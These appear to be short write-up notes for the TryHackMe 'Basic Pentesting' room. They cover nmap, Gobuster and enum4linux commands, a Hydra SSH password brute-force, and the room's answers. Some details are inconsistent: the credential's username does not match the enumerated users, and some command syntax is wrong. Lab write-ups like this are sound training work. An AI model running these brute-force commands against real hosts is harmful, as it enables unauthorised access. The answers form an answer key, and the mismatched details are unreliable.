# Basic Pentesting (TryHackMe)
IP: `10.10.23.195`

# Scanning
```
nmap -sC -sV -oN 10.10.23.195
```

```
22
80
139
445
8009
8080
```

# Question And Answers

* Hidden directory on the web server (`development`, via Gobuster)
```
gobuster -w /opt/DirBuster-0.12/directory-list-2.3-medium.txt -u http://10.10.23.195/	
```
* Username (`jan` and `kay` via enum4linux)
```
/opt/enum4linux/enum4linux.pl -a http://10.10.23.195/
```
* Password (`jay:armando` via Hydra with SHH)
```
hydra -l jan -P /opt/rock.txt ssh://10.10.23.195
```

# Found Credentials








